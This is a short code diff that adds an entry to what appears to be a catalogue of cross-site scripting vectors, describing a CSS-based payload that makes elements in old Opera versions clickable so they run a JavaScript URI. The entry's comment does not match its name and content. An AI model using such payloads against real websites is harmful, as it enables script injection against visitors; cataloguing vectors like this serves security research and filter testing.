@@ -116,6 +116,20 @@
             },
             'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'opera'],
             'reporter'   : '.mario'
-        }        
+        },
+        { /* ID 9 - Self-executing blur event via neighboured */
+            'id'         : 9, 
+            'category'   : 'css', 
+            'name'       : 'Opera link-source JavaScript execution via CSS',
+            'data'       : '<div style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
+            'description': 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript',
+            'browsers'   : {
+                'opera': [
+                    '8.0', '9.0', '10.0', '10.5'
+                ]
+            },
+            'tags'       : ['xss', 'css', 'link-source', 'opera'],
+            'reporter'   : '.mario'
+        } 
     ]        
 }
